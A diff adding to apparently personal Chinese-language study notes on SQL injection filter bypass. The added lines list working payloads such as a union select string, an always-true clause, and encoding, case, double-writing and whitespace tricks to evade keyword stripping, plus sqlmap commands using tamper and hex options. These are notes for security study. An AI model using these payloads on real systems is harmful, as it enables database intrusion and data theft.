@@ -143,6 +143,44 @@ sql注入：
         sqlmap：
             sqlmap.py -r target.txt --level 3 --tamper base64encode.py
 
+    绕过去除注释符：
+        单行注释：
+            --+ 或者 --格 或者 #
+        多行注释：
+            /* 注释内容 */
+
+        目的：
+            绕过 preg_replace() 正则的搜索和替换
+
+        绕过：
+            主动闭合 or '1'='1
+                id=-1' union select 1, database(), '3
+
+        sqlmap：
+
+    绕过去除and和or：
+        目的：
+            绕过 preg_replace() 正则的搜索和替换
+        绕过：
+            大小写
+            十六进制、URL编码
+            and 等于 &&、or 等于 ||
+            /*! 内联注释 */ 会被当作SQL语句执行
+                a/**/nd 
+            双写绕过
+                oorr
+
+    绕过去除空格：
+        hex、url编码
+        id=1'%0a||'1     id=1'||'1
+        id=1'%09||'1
+
+        sqlmap:
+            sqlmap.py -u "url" --hex --dbs --batch
+
+    绕过去除select和union：
+        同上
+        
     SQLmap： 
         探测：
             -u 探测url
